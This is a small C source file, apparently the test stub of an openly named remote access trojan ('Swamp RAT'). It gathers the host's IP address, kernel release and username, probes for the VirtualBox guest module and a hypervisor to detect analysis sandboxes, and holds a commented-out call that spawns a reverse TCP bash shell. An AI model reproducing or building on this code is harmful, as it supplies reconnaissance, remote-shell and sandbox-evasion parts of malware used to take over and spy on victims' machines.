/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>
#include "include/stub/shell.h"
#include "include/stub/sys.h"
#include "include/stub/re.h"
void help_menu(){
  printf("Swamp RAT Stub!\n");
}

int main(){
  help_menu();
  //shell_spawn_reverse_tcp("127.0.0.1", 4444, SHELL_BASH, SHELL_ASYNC_FALSE);
  sys_info_t *p_sys_info = sys_info();
  printf("%s\n", p_sys_info->ip);
  printf("%s\n", p_sys_info->release);
  printf("%s\n", p_sys_info->username);
  free(p_sys_info);
  printf("module: %d\n", re_kernel_module("vboxguest"));
  printf("hypervisor: %d\n", re_hypervisor());
  return 0;
}
